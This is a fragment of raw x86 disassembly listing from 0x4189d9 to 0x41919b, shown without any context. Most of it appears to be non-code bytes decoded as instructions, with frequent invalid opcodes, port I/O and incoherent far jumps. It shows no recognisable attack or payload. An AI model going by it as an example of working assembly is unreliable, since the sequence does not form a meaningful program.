  4189d9:	fstp   QWORD PTR [edx+0x2f]
  4189dc:	mov    esi,0x3bd9de48
  4189e1:	hlt    
  4189e2:	repnz and BYTE PTR [esi+0x26],dh
  4189e6:	jbe    0x418a46
  4189e8:	mov    esp,0x363d7cb9
  4189ed:	xchg   ecx,eax
  4189ee:	mov    ds:0x9b0169fc,al
  4189f3:	data16 into 
  4189f5:	sti    
  4189f6:	(bad)  
  4189f7:	jmp    DWORD PTR [esi]
  4189f9:	sbb    al,0xef
  4189fb:	sub    eax,DWORD PTR [eax]
  4189fd:	lods   al,BYTE PTR ds:[esi]
  4189fe:	test   al,0xa9
  418a00:	lods   eax,DWORD PTR ds:[esi]
  418a01:	add    DWORD PTR [ebp-0x9],edi
  418a04:	xor    DWORD PTR [ebx],edx
  418a06:	inc    ebx
  418a07:	in     al,dx
  418a08:	cdq    
  418a09:	add    esp,DWORD PTR [edx]
  418a0b:	cmp    DWORD PTR [edi],edi
  418a0d:	mov    dl,0x50
  418a0f:	and    BYTE PTR [eax-0x7b48a115],bh
  418a15:	dec    ebp
  418a16:	pop    ecx
  418a17:	rcr    dh,1
  418a19:	xchg   ebp,eax
  418a1a:	jl     0x4189d4
  418a1c:	mov    dl,BYTE PTR [ebx-0x1b]
  418a1f:	call   0xb3363f99
  418a24:	sbb    dl,ch
  418a26:	test   eax,0x24f31fed
  418a2b:	sub    al,0x7
  418a2d:	and    DWORD PTR es:[ebx-0x69682d4],edx
  418a34:	dec    eax
  418a35:	jl     0x418aa5
  418a37:	into   
  418a38:	mov    cl,0x5c
  418a3a:	scas   eax,DWORD PTR es:[edi]
  418a3b:	push   ebp
  418a3c:	pop    ds
  418a3d:	and    eax,0xa48286c2
  418a42:	dec    esi
  418a43:	daa    
  418a44:	lea    eax,[edx+0x47]
  418a47:	xchg   esp,eax
  418a48:	(bad)  
  418a49:	gs push 0x5f
  418a4c:	lds    esp,FWORD PTR [edi-0x3931bf0d]
  418a52:	test   bl,bl
  418a54:	int    0x7d
  418a56:	mov    edi,0x39197d8b
  418a5b:	adc    al,0xbd
  418a5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5e:	xchg   ecx,eax
  418a5f:	(bad)  
  418a60:	cmp    dh,BYTE PTR [eax+0x66]
  418a63:	fcomp  DWORD PTR [ebx+ebx*1+0x18]
  418a67:	mov    WORD PTR [esi+esi*4+0x234a9513],ss
  418a6e:	(bad)  
  418a6f:	push   ss
  418a70:	add    cl,cl
  418a72:	and    dl,BYTE PTR [edi-0x5b]
  418a75:	cdq    
  418a76:	sti    
  418a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a78:	push   ds
  418a79:	adc    ah,dh
  418a7b:	outs   dx,DWORD PTR ds:[esi]
  418a7c:	enter  0xc663,0x87
  418a80:	add    BYTE PTR [edx+eax*2],bl
  418a83:	mov    ds:0xabcf72bd,eax
  418a88:	dec    esi
  418a89:	sbb    edx,eax
  418a8b:	cmp    al,bl
  418a8d:	jle    0x418af0
  418a8f:	sar    BYTE PTR [ebx],1
  418a91:	dec    esp
  418a92:	mov    ah,0xda
  418a94:	int    0x2e
  418a96:	ficom  DWORD PTR [ebp+0x19ad6eb8]
  418a9c:	(bad)  
  418a9e:	push   ebx
  418a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aa0:	jb     0x418ab1
  418aa2:	nop
  418aa3:	stos   BYTE PTR es:[edi],al
  418aa4:	jb     0x418ae9
  418aa6:	fst    DWORD PTR [edi+ebp*4]
  418aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aaa:	lahf   
  418aab:	bound  edi,QWORD PTR ds:0x5917f56d
  418ab1:	(bad)  
  418ab2:	and    dl,al
  418ab4:	push   ebx
  418ab5:	ja     0x418ada
  418ab7:	imul   eax,DWORD PTR ds:0xde7bd8ab,0xc155964e
  418ac1:	jno    0x418b13
  418ac3:	add    DWORD PTR [ebp-0x7c8d268c],ebx
  418ac9:	iret   
  418aca:	fisttp WORD PTR [ebp+0x16]
  418acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ace:	and    al,0xd2
  418ad0:	push   esi
  418ad1:	cmp    ch,BYTE PTR [edx-0x1dfa2f79]
  418ad7:	inc    ecx
  418ad8:	stc    
  418ad9:	xor    BYTE PTR [eax-0x13e5bd91],ah
  418adf:	dec    edx
  418ae0:	and    bh,bh
  418ae2:	mov    al,0x9d
  418ae4:	(bad)  
  418ae5:	rol    BYTE PTR ds:0x71712708,0x4f
  418aec:	je     0x418ac1
  418aee:	in     eax,0x9e
  418af0:	push   ds
  418af1:	add    DWORD PTR [eax+0x14c184dd],0x9e669cd0
  418afb:	push   ebx
  418afc:	add    BYTE PTR [ebx+0x4212df67],dh
  418b02:	(bad)  [eax+0x5ee18017]
  418b08:	jno    0x418b53
  418b0a:	popf   
  418b0b:	or     DWORD PTR [ebx-0x1a81aadc],esi
  418b11:	mov    ebp,0xadd1f7c6
  418b16:	xchg   esi,eax
  418b17:	pop    ebx
  418b18:	push   esi
  418b19:	sub    al,dh
  418b1b:	jns    0x418ae1
  418b1d:	mov    edx,0xb332591c
  418b22:	sbb    DWORD PTR ds:0x61b3e44c,0x865da827
  418b2c:	shr    esi,cl
  418b2e:	xchg   DWORD PTR [edx],edx
  418b30:	les    esi,FWORD PTR ds:0xb6521fe2
  418b36:	sbb    esp,esp
  418b38:	inc    ebx
  418b39:	(bad)  
  418b3a:	cmp    al,0x76
  418b3c:	(bad)  
  418b3e:	ins    BYTE PTR es:[edi],dx
  418b3f:	cmp    bl,BYTE PTR [ebx+0xf]
  418b42:	add    edx,ebp
  418b44:	dec    edi
  418b45:	out    0x73,al
  418b47:	mov    ah,0x51
  418b49:	lods   eax,DWORD PTR ds:[esi]
  418b4a:	add    eax,0x2db8a470
  418b4f:	sbb    ah,cl
  418b51:	fstp   st(6)
  418b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b54:	pop    ebx
  418b55:	repnz mov ?,WORD PTR ds:[esi+0x79]
  418b5a:	xchg   ebx,eax
  418b5b:	mov    DWORD PTR ds:0x74fd,edx
  418b60:	bound  ebp,QWORD PTR [ebp-0x465090cc]
  418b66:	mov    bh,0xeb
  418b68:	jne    0x418b97
  418b6a:	push   ebx
  418b6b:	mov    BYTE PTR [ecx+0x61],0x27
  418b6f:	mov    edx,0x32e38b0f
  418b74:	jecxz  0x418ba4
  418b76:	je     0x418b01
  418b78:	add    ah,BYTE PTR [edi]
  418b7a:	arpl   si,bx
  418b7c:	repz or bh,BYTE PTR [ebx-0x17]
  418b80:	ss mov ebx,0x693cc185
  418b86:	clc    
  418b87:	push   ecx
  418b88:	pushf  
  418b89:	cdq    
  418b8a:	out    dx,al
  418b8b:	xor    cl,cl
  418b8d:	xchg   edx,eax
  418b8e:	or     DWORD PTR [ebp-0x75],edx
  418b91:	jmp    FWORD PTR [eax-0x6a]
  418b94:	mov    esi,0xe1089302
  418b9a:	xchg   ebx,eax
  418b9b:	sub    DWORD PTR [edx],0x2eb289f2
  418ba1:	test   al,0x75
  418ba3:	jl     0x418b9f
  418ba5:	jae    0x418bda
  418ba7:	ja     0x418c28
  418ba9:	not    BYTE PTR [esp+esi*2+0x76]
  418bad:	hlt    
  418bae:	js     0x418bf9
  418bb0:	mov    ebx,gs
  418bb2:	ds clc 
  418bb4:	or     edi,ebp
  418bb6:	mul    DWORD PTR [esi+0x7e4a3302]
  418bbc:	adc    cl,BYTE PTR [eax-0x651592f1]
  418bc2:	lds    edi,FWORD PTR [edx]
  418bc4:	push   edi
  418bc5:	xor    eax,0xb96588f6
  418bca:	ror    edx,0xb6
  418bcd:	jp     0x418bdc
  418bcf:	test   eax,0x14a16a7f
  418bd4:	lea    eax,[ecx+esi*8-0x3e16fdf8]
  418bdb:	cdq    
  418bdc:	ficom  DWORD PTR [edi]
  418bde:	ins    BYTE PTR es:[edi],dx
  418bdf:	fnstcw WORD PTR [ecx]
  418be1:	fld    DWORD PTR [esi-0x3b78ce26]
  418be7:	test   eax,0x57b7c8fd
  418bec:	push   esp
  418bed:	jg     0x418bb8
  418bef:	sub    BYTE PTR [edx],ch
  418bf1:	mov    ds:0xbd263a54,al
  418bf6:	pop    ecx
  418bf7:	gs adc eax,esi
  418bfa:	nop
  418bfb:	test   eax,0xbd4d0633
  418c00:	aaa    
  418c01:	inc    cl
  418c03:	fcom   st(7)
  418c05:	mov    eax,0x1ee578d9
  418c0a:	push   edi
  418c0b:	jbe    0x418bdc
  418c0d:	out    dx,al
  418c0e:	ja     0x418bc7
  418c10:	stc    
  418c11:	iret   
  418c12:	mov    edi,0x4cad87cb
  418c17:	mov    ds:0xb6a2b05e,al
  418c1c:	cmp    eax,0xdb4fd5be
  418c21:	xor    BYTE PTR [edx-0x5f],0x9e
  418c25:	mov    esp,0x70877489
  418c2a:	push   esp
  418c2b:	and    DWORD PTR [eax-0x2f],edx
  418c2e:	ins    BYTE PTR es:[edi],dx
  418c2f:	dec    esp
  418c30:	lock mov esi,edx
  418c33:	into   
  418c34:	or     ecx,ecx
  418c36:	xor    BYTE PTR [edx+eiz*1-0x76429db4],dl
  418c3d:	fistp  WORD PTR [ecx+eax*8]
  418c40:	lods   eax,DWORD PTR ds:[esi]
  418c41:	mov    DWORD PTR [eax-0x6454bc61],eax
  418c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c48:	jmp    0xed57:0x52d664d9
  418c4f:	stos   BYTE PTR es:[edi],al
  418c50:	lock cmp eax,0x1938c504
  418c56:	jns    0x418c2c
  418c58:	sub    bh,ch
  418c5a:	mov    cl,0x5
  418c5c:	cmp    dl,bh
  418c5e:	imul   edx,DWORD PTR [ecx+0x36e133f3],0xffffffb5
  418c65:	sbb    BYTE PTR [edx-0x7958b8b9],al
  418c6b:	test   DWORD PTR [ecx+ecx*2-0x2e],0x9229668b
  418c73:	jno    0x418c42
  418c75:	mov    BYTE PTR gs:[eax],dl
  418c78:	jns    0x418c1b
  418c7a:	cdq    
  418c7b:	sub    bl,BYTE PTR [ebx+0x33]
  418c7e:	cmp    DWORD PTR [ebx],edi
  418c80:	retf   0x83b5
  418c83:	stos   DWORD PTR es:[edi],eax
  418c84:	xchg   esi,eax
  418c85:	dec    esp
  418c86:	pop    edx
  418c87:	cdq    
  418c88:	sbb    DWORD PTR [ebp+0x6c],eax
  418c8b:	aas    
  418c8c:	mov    cs,eax
  418c8e:	sub    BYTE PTR [ecx-0x70],al
  418c91:	mov    esi,DWORD PTR [edi]
  418c93:	add    DWORD PTR [ecx-0x69],edx
  418c96:	jg     0x418c83
  418c98:	imul   esi,esp,0x6b19486f
  418c9e:	loop   0x418c3f
  418ca0:	retf   
  418ca1:	cs mov ebp,0x3507e26b
  418ca7:	push   ebx
  418ca8:	or     al,0x84
  418caa:	and    ebp,ebx
  418cac:	outs   dx,DWORD PTR ds:[esi]
  418cad:	pop    edx
  418cae:	push   edi
  418caf:	inc    ecx
  418cb0:	in     eax,0xe3
  418cb2:	xchg   ecx,eax
  418cb3:	clc    
  418cb4:	jnp    0x418c98
  418cb6:	and    al,0x9a
  418cb8:	dec    eax
  418cb9:	stc    
  418cba:	xchg   DWORD PTR [ebp-0x2d],ebp
  418cbd:	mov    al,0xa
  418cbf:	jb     0x418d14
  418cc1:	loopne 0x418c4d
  418cc3:	aad    0x23
  418cc5:	cwde   
  418cc6:	icebp  
  418cc7:	test   DWORD PTR [edx+0x52],0xfbe9e705
  418cce:	inc    esi
  418ccf:	or     esi,DWORD PTR [eax+0x30]
  418cd2:	add    BYTE PTR [ebx+0x78],0x6f
  418cd6:	adc    ah,BYTE PTR [edi-0x58]
  418cd9:	adc    al,0xd9
  418cdb:	cmp    DWORD PTR [eax-0x6c],esp
  418cde:	not    DWORD PTR [edx+0x19]
  418ce1:	sahf   
  418ce2:	in     al,dx
  418ce3:	xchg   edi,eax
  418ce4:	stc    
  418ce5:	(bad)  
  418ce6:	mov    ds:0xf603e74,eax
  418ceb:	xor    esp,ecx
  418ced:	mov    eax,ds:0xe90cfe54
  418cf2:	adc    eax,eax
  418cf4:	jns    0x418cf5
  418cf6:	imul   eax,DWORD PTR [edx+esi*8],0xffffffc6
  418cfa:	nop
  418cfb:	dec    eax
  418cfc:	in     eax,0x96
  418cfe:	aam    0x49
  418d00:	adc    BYTE PTR ds:0xb4a1a44,ch
  418d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d07:	out    dx,al
  418d08:	and    al,0x98
  418d0a:	cmp    BYTE PTR ds:0x564aef62,bl
  418d10:	cwde   
  418d11:	mov    ah,0x89
  418d13:	out    0x81,al
  418d15:	sub    cl,BYTE PTR [eax]
  418d17:	push   esp
  418d18:	or     eax,0xe60503e4
  418d1d:	push   0x61b17b6d
  418d22:	shl    BYTE PTR [esi-0x4b],1
  418d25:	not    BYTE PTR [edx]
  418d27:	(bad)  
  418d28:	mov    ebx,0x3d6ad950
  418d2d:	mov    esp,0x20ea816c
  418d32:	dec    eax
  418d33:	xchg   sp,ax
  418d35:	mov    BYTE PTR [ecx+0x57352b3f],cl
  418d3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d3c:	ds mov cl,0x83
  418d3f:	pop    ecx
  418d40:	popa   
  418d41:	mov    cl,0x6b
  418d43:	cmp    BYTE PTR [esi-0x6f],0x2
  418d47:	ret    
  418d48:	mov    eax,ds:0x23c3461c
  418d4d:	scas   eax,DWORD PTR es:[edi]
  418d4e:	outs   dx,DWORD PTR ds:[esi]
  418d4f:	(bad)  
  418d50:	cs inc ecx
  418d52:	das    
  418d53:	test   BYTE PTR [edx-0x5f86f42f],dh
  418d59:	push   es
  418d5a:	add    al,0x3
  418d5c:	mov    bl,0x2e
  418d5e:	sbb    edx,esi
  418d60:	cmp    al,BYTE PTR [ebx+ebp*8]
  418d63:	mov    edi,0xa24b65e2
  418d68:	rol    DWORD PTR [edx+0x7f284279],cl
  418d6e:	cmp    ch,cl
  418d70:	lock pop ss
  418d72:	lods   eax,DWORD PTR ds:[esi]
  418d73:	(bad)  
  418d74:	push   cs
  418d75:	cmp    DWORD PTR [ebx*4-0x41d5d5b7],ecx
  418d7c:	jb     0x418d80
  418d7e:	mov    edx,0x93094754
  418d83:	mov    ebp,0x16082ec9
  418d88:	ds call 0xc69131bb
  418d8e:	popa   
  418d8f:	neg    DWORD PTR [edi]
  418d91:	sub    al,0x30
  418d93:	(bad)  
  418d94:	iret   
  418d95:	int    0x1b
  418d97:	mov    dh,0xe7
  418d99:	mov    BYTE PTR [ebx],cl
  418d9b:	push   es
  418d9c:	js     0x418dd2
  418d9e:	sbb    DWORD PTR [ecx+0x55c19f0b],ebp
  418da4:	cmp    dl,cl
  418da6:	call   0xb44fd523
  418dab:	pop    ecx
  418dac:	ins    BYTE PTR es:[edi],dx
  418dad:	sbb    al,0x27
  418daf:	push   eax
  418db0:	loop   0x418d48
  418db2:	in     eax,0x4e
  418db4:	mov    ah,0xfe
  418db6:	rol    DWORD PTR [edx],cl
  418db8:	mov    ?,ecx
  418dba:	imul   esp,ebx,0x7b
  418dbd:	mov    bl,0x0
  418dbf:	and    edi,DWORD PTR [ebp+0x6a]
  418dc2:	xchg   esi,eax
  418dc3:	int    0x28
  418dc5:	test   eax,0xa7718ac3
  418dca:	push   esp
  418dcb:	addr16 cdq 
  418dcd:	xchg   esp,eax
  418dce:	pop    ds
  418dcf:	pop    edi
  418dd0:	fild   DWORD PTR [edx+0x5c1a402]
  418dd6:	scas   eax,DWORD PTR es:[edi]
  418dd7:	inc    BYTE PTR gs:[edx+0x2a]
  418ddb:	mov    DWORD PTR [edx-0x1c],0xf0f4aae8
  418de2:	mov    edi,0x56e253e0
  418de7:	push   eax
  418de8:	mov    al,0x17
  418dea:	inc    edx
  418deb:	push   esi
  418dec:	mov    WORD PTR [ebx-0x7c],es
  418def:	icebp  
  418df0:	stos   DWORD PTR es:[edi],eax
  418df1:	mov    ebp,DWORD PTR [eax]
  418df3:	mov    bh,dl
  418df5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418df6:	popa   
  418df7:	lods   eax,DWORD PTR ds:[esi]
  418df8:	or     eax,0x5e7f0fed
  418dfd:	mov    bl,BYTE PTR [ecx-0x50]
  418e00:	retf   0xee3f
  418e03:	mov    ds:0x19ec17e5,eax
  418e08:	jecxz  0x418de8
  418e0a:	aad    0x19
  418e0c:	int    0x67
  418e0e:	cdq    
  418e0f:	int    0xb6
  418e11:	(bad)  
  418e12:	mov    cl,0xbe
  418e14:	xchg   edx,eax
  418e15:	sbb    BYTE PTR [esi-0x1798494a],al
  418e1b:	adc    bl,BYTE PTR [esi]
  418e1d:	jnp    0x418ddc
  418e1f:	sbb    eax,0x313eda65
  418e24:	push   ecx
  418e25:	pushf  
  418e26:	sbb    eax,DWORD PTR [ebx+edi*8+0x8745bf6]
  418e2d:	jmp    0x418e29
  418e2f:	mov    dl,0xae
  418e31:	dec    esi
  418e32:	ins    DWORD PTR es:[edi],dx
  418e33:	in     al,0xa4
  418e35:	push   0x1f493f86
  418e3a:	and    DWORD PTR [edx+0x189597b0],ecx
  418e40:	dec    ebx
  418e41:	clc    
  418e42:	(bad)  
  418e43:	cmp    esi,DWORD PTR [esi]
  418e45:	mov    ds:0xa13bf40e,al
  418e4a:	sub    eax,0xd7c5e0ed
  418e4f:	sub    BYTE PTR [ecx],ah
  418e51:	fistp  WORD PTR [edx]
  418e53:	mov    BYTE PTR [esi],0xa4
  418e56:	fxch   st(4)
  418e58:	push   edi
  418e59:	sahf   
  418e5a:	mov    dh,BYTE PTR [eax-0x6e]
  418e5d:	inc    ebx
  418e5e:	jmp    0x7787ac11
  418e63:	mov    BYTE PTR [eax+0x7e5447f7],dl
  418e69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e6a:	dec    esi
  418e6b:	dec    esi
  418e6c:	stc    
  418e6d:	pop    ecx
  418e6e:	aaa    
  418e6f:	sbb    DWORD PTR [edi+ecx*1-0x47],esp
  418e73:	ficom  DWORD PTR [ebx+0x62]
  418e76:	dec    ebx
  418e77:	cmp    bh,bh
  418e79:	out    dx,al
  418e7a:	nop
  418e7b:	mov    edi,0x2cd36ac8
  418e80:	fs in  al,dx
  418e82:	mov    ds:0x31f9bf00,al
  418e87:	mov    dh,0x60
  418e89:	mov    ch,0x49
  418e8b:	sub    DWORD PTR [ebp+esi*1+0x7b],0xffffffe7
  418e90:	enter  0xd58a,0x11
  418e94:	fnstcw WORD PTR [esi-0x1a]
  418e97:	leave  
  418e98:	cmp    DWORD PTR [esi+0x3b],ebp
  418e9b:	sbb    ebx,0x5
  418e9e:	int3   
  418e9f:	lock outs dx,DWORD PTR ds:[esi]
  418ea1:	mov    edx,DWORD PTR [edi+0x2cf0653]
  418ea7:	(bad)  
  418ea8:	into   
  418ea9:	mov    dl,0xa8
  418eab:	out    0x2,eax
  418ead:	int    0x14
  418eaf:	jo     0x418e59
  418eb1:	lods   al,BYTE PTR ds:[esi]
  418eb2:	push   0x13c072d7
  418eb7:	or     edi,DWORD PTR [ecx+0x347d808b]
  418ebd:	push   esi
  418ebe:	aaa    
  418ebf:	cdq    
  418ec0:	and    dh,al
  418ec2:	xchg   edi,eax
  418ec3:	push   ecx
  418ec4:	imul   ebp,DWORD PTR [eax+0x6a],0x968cf452
  418ecb:	dec    edx
  418ecc:	(bad)
  418ed1:	mov    cl,0xdc
  418ed3:	xchg   esp,eax
  418ed4:	jo     0x418f1e
  418ed6:	and    ah,BYTE PTR [eax+edx*2]
  418ed9:	adc    al,0x6
  418edb:	rcl    BYTE PTR [ebp+0x58],1
  418ede:	and    esp,DWORD PTR [eax-0x70e45193]
  418ee4:	sub    al,BYTE PTR [edi+0x22]
  418ee7:	adc    BYTE PTR [edi+0x63ae685],0x34
  418eee:	lods   al,BYTE PTR ds:[esi]
  418eef:	push   ds
  418ef0:	retf   
  418ef1:	sub    DWORD PTR [ecx-0x37daf2de],ecx
  418ef7:	add    bl,ah
  418ef9:	pusha  
  418efa:	push   eax
  418efb:	(bad)  
  418efc:	and    eax,0x34fc877c
  418f01:	dec    ecx
  418f02:	int    0xc6
  418f04:	fnstenv [ebx+0x3654adb4]
  418f0a:	ins    DWORD PTR es:[edi],dx
  418f0b:	retf   
  418f0c:	jg     0x418ee9
  418f0e:	or     al,0x8d
  418f10:	dec    ebp
  418f11:	(bad)  [esi-0x398b1cc9]
  418f17:	mov    ch,0xef
  418f19:	fstp   DWORD PTR [ebx+0x7e]
  418f1c:	jns    0x418eed
  418f1e:	ret    
  418f1f:	mov    edx,0xc6c5dd68
  418f24:	mov    ecx,0x60e9f4a
  418f29:	or     al,bl
  418f2b:	sar    BYTE PTR [esi],1
  418f2d:	dec    esi
  418f2e:	xor    eax,0x52c34a57
  418f33:	xor    edx,DWORD PTR [eax]
  418f35:	push   esi
  418f36:	sub    al,0xfa
  418f38:	fiadd  WORD PTR [ecx-0x20c6babc]
  418f3e:	in     al,0x27
  418f40:	add    edi,DWORD PTR [ebx+0x7c43ac97]
  418f46:	in     al,0x5c
  418f48:	pop    edi
  418f49:	push   0x7e01abab
  418f4e:	rcl    BYTE PTR [ecx],0x2b
  418f51:	jl     0x418f75
  418f53:	push   ebx
  418f54:	pushf  
  418f55:	fwait
  418f56:	xchg   ebx,eax
  418f57:	pushf  
  418f58:	pushf  
  418f59:	fisttp WORD PTR [esi-0x3d4b5505]
  418f5f:	stos   BYTE PTR es:[edi],al
  418f60:	jns    0x418f47
  418f62:	in     eax,dx
  418f63:	or     DWORD PTR [edx+0x4e5a5240],edx
  418f69:	or     BYTE PTR fs:[ecx],dh
  418f6c:	push   es
  418f6d:	jns    0x418f39
  418f6f:	retf   
  418f70:	bound  ecx,QWORD PTR [ebx]
  418f72:	(bad)  
  418f74:	mov    DWORD PTR [ebx],ecx
  418f76:	pop    ds
  418f77:	aam    0xdf
  418f79:	add    DWORD PTR [edx+0x37],edi
  418f7c:	loopne 0x418f5c
  418f7e:	(bad)  
  418f7f:	lds    eax,FWORD PTR [edx+0x28]
  418f82:	push   ecx
  418f83:	int    0x86
  418f85:	adc    cl,BYTE PTR [edi-0x4b]
  418f88:	xor    BYTE PTR [eax+ebx*4-0x54],0x72
  418f8d:	pop    eax
  418f8e:	xchg   ebp,eax
  418f8f:	push   es
  418f90:	cmc    
  418f91:	xchg   ebp,eax
  418f92:	pop    ebp
  418f93:	mov    ds:0x4fb07cd6,eax
  418f98:	xlat   BYTE PTR ds:[ebx]
  418f99:	popa   
  418f9a:	call   0xd1f4:0xf3cd87f8
  418fa1:	repz icebp 
  418fa3:	xor    eax,0x5083046c
  418fa8:	jb     0x418f9c
  418faa:	bnd ja 0x418fb1
  418fad:	mov    edx,0x89d357ba
  418fb2:	data16 mov bh,0x57
  418fb5:	xor    ch,dl
  418fb7:	call   0x4d96:0x263e7d9e
  418fbe:	ds inc ebp
  418fc0:	mov    cl,0x9
  418fc2:	or     eax,0xac6f1fd9
  418fc7:	adc    al,0x4f
  418fc9:	add    DWORD PTR [ecx],ebx
  418fcb:	push   DWORD PTR [ebp-0x7f3527d8]
  418fd1:	repz mov ebp,0x91c4dd6
  418fd7:	popf   
  418fd8:	jp     0x418fe0
  418fda:	cwde   
  418fdb:	outs   dx,DWORD PTR ds:[esi]
  418fdc:	sbb    eax,0x3a4ed721
  418fe1:	jno    0x41904d
  418fe3:	adc    ebx,DWORD PTR [edx-0x29]
  418fe6:	xchg   esi,ebp
  418fe8:	(bad)  
  418fe9:	cmp    al,0xf2
  418feb:	inc    BYTE PTR [esi-0x4e]
  418fee:	mov    ds:0xf62ebc02,eax
  418ff3:	push   0x72fec961
  418ff8:	sbb    ebp,DWORD PTR [esp+eiz*8-0x138ce13f]
  418fff:	ficom  DWORD PTR [ecx]
  419001:	pop    edi
  419002:	lods   eax,DWORD PTR ds:[esi]
  419003:	mov    ecx,0x58c7b258
  419008:	pop    edi
  419009:	add    dh,bl
  41900b:	pop    esi
  41900c:	sub    al,0x2e
  41900e:	fstp   QWORD PTR [ecx]
  419010:	mov    ecx,0xb35cff66
  419015:	js     0x419062
  419017:	mov    dh,0x4f
  419019:	in     eax,dx
  41901a:	add    esp,esi
  41901c:	clc    
  41901d:	scas   al,BYTE PTR es:[edi]
  41901e:	mov    bl,0x3c
  419020:	repz into 
  419022:	mov    DWORD PTR [edi+0x32],ebx
  419025:	mov    cl,0xef
  419027:	mov    eax,eax
  419029:	and    esi,DWORD PTR [esi+0x5c]
  41902c:	lods   al,BYTE PTR ds:[esi]
  41902d:	fcom   QWORD PTR [ecx-0x2c]
  419030:	out    dx,eax
  419031:	imul   ebx,DWORD PTR [esi],0x79647f2e
  419037:	jmp    0x156:0x19bc0ba0
  41903e:	push   0x7b
  419040:	call   0xd2ce50a2
  419045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419046:	nop
  419047:	scas   al,BYTE PTR es:[edi]
  419048:	(bad)  
  419049:	mov    ds:0x50c0b89c,al
  41904e:	push   esp
  41904f:	sbb    al,0xbb
  419051:	push   0xfffffff1
  419053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419054:	mov    edi,0x368e4f75
  419059:	ss push ds
  41905b:	fwait
  41905c:	mov    ebp,0xb21b533e
  419061:	lds    esi,FWORD PTR [ecx]
  419063:	dec    ebp
  419064:	add    eax,0xcec38ee4
  419069:	adc    eax,0xd23d1f46
  41906e:	les    eax,FWORD PTR [ecx+0x609609cc]
  419074:	in     eax,dx
  419075:	sahf   
  419076:	or     eax,esp
  419078:	iret   
  419079:	call   0xbc51:0xa1d71c25
  419080:	pop    edi
  419081:	cwde   
  419082:	ins    DWORD PTR es:[edi],dx
  419083:	in     eax,dx
  419084:	or     DWORD PTR [ebp-0x4ba43914],0x50d09c67
  41908e:	inc    eax
  41908f:	fisubr DWORD PTR fs:[edx+0x11]
  419093:	pop    ss
  419094:	lods   eax,DWORD PTR ds:[esi]
  419095:	fistp  QWORD PTR [edi+0x432c43fa]
  41909b:	rcl    DWORD PTR [edx],1
  41909d:	xchg   esp,eax
  41909e:	ror    BYTE PTR [edi],1
  4190a0:	inc    edx
  4190a1:	arpl   WORD PTR [ecx+0x7a],bp
  4190a4:	ja     0x419108
  4190a6:	and    esi,DWORD PTR [ecx+0x2e]
  4190a9:	fsub   DWORD PTR [esi-0x1174ae76]
  4190af:	ret    0xbfce
  4190b2:	retf   0xbdeb
  4190b5:	mov    ds:0xf9bdc3f5,al
  4190ba:	or     eax,0x93eb044
  4190bf:	and    edi,DWORD PTR [edi-0x3ba1a05f]
  4190c5:	sbb    eax,0x7e2d58c1
  4190ca:	xchg   edx,eax
  4190cb:	xchg   esi,eax
  4190cc:	jecxz  0x419128
  4190ce:	push   0x44b3a45d
  4190d3:	mov    ebx,0x2913cc39
  4190d8:	mov    bl,0xd8
  4190da:	jmp    0x626e:0x487d6091
  4190e1:	ds mov ecx,0xf1a73f4e
  4190e7:	mov    dh,0xfd
  4190e9:	out    dx,al
  4190ea:	sbb    DWORD PTR [esp+edi*2-0x5dc0e078],esi
  4190f1:	lods   eax,DWORD PTR ds:[esi]
  4190f2:	push   ecx
  4190f3:	mov    edx,DWORD PTR [esi+0x5598e5f4]
  4190f9:	jmp    0x419160
  4190fb:	jbe    0x41909a
  4190fd:	mov    dl,bh
  4190ff:	aas    
  419100:	sub    dl,ch
  419102:	std    
  419103:	imul   esi,DWORD PTR [ebx],0x21
  419106:	js     0x4190a6
  419108:	out    dx,eax
  419109:	pop    esi
  41910a:	xchg   esi,eax
  41910b:	mov    bh,al
  41910d:	js     0x4190f2
  41910f:	loopne 0x4190ad
  419111:	out    0x47,al
  419113:	stc    
  419114:	retf   
  419115:	xchg   ebp,eax
  419116:	or     esp,DWORD PTR [ebx-0x6f]
  419119:	sub    eax,0xb805ca5
  41911e:	add    BYTE PTR [ecx-0x933d896],bl
  419124:	(bad)
  419127:	(bad)  
  419128:	mov    bl,0x2c
  41912a:	jo     0x41913f
  41912c:	push   ebp
  41912d:	add    al,0xe2
  41912f:	mov    eax,ds:0x51eb9237
  419134:	ins    BYTE PTR es:[edi],dx
  419135:	fs pushf 
  419137:	inc    edi
  419138:	inc    eax
  419139:	cmp    DWORD PTR [esi],0xa2cc36e1
  41913f:	je     0x419106
  419141:	mov    dl,0xb7
  419143:	push   edi
  419144:	out    0x84,al
  419146:	sub    ebp,ecx
  419148:	jl     0x419152
  41914a:	out    0x47,al
  41914c:	mov    ch,0x6e
  41914e:	shl    ecx,0xc0
  419151:	(bad)  
  419152:	xchg   esp,eax
  419153:	push   ds
  419154:	in     eax,dx
  419155:	dec    ebx
  419156:	lahf   
  419157:	cld    
  419158:	fisttp QWORD PTR [edi+0x43581a73]
  41915e:	sar    DWORD PTR ds:0x85f561a9,0xf2
  419165:	mov    BYTE PTR [esi+eax*4+0x7d],ch
  419169:	jg     0x41916b
  41916b:	js     0x41912e
  41916d:	fisubr DWORD PTR [ebx]
  41916f:	xchg   edx,eax
  419170:	enter  0x7424,0x62
  419174:	xor    esi,DWORD PTR [esi+edx*1+0x1994e6f5]
  41917b:	mul    BYTE PTR [esp+ebp*8-0x3138d758]
  419182:	dec    ecx
  419183:	adc    ch,BYTE PTR [ebx+0x56]
  419186:	pop    ecx
  419187:	push   0xffffffc0
  419189:	sbb    al,BYTE PTR [esi+0x21]
  41918c:	add    esi,DWORD PTR [eax+0x72]
  41918f:	hlt    
  419190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419191:	sahf   
  419192:	std    
  419193:	jns    0x419122
  419195:	sar    BYTE PTR [ebp+0x48d1828f],cl
  41919b:	out    0xbc,al
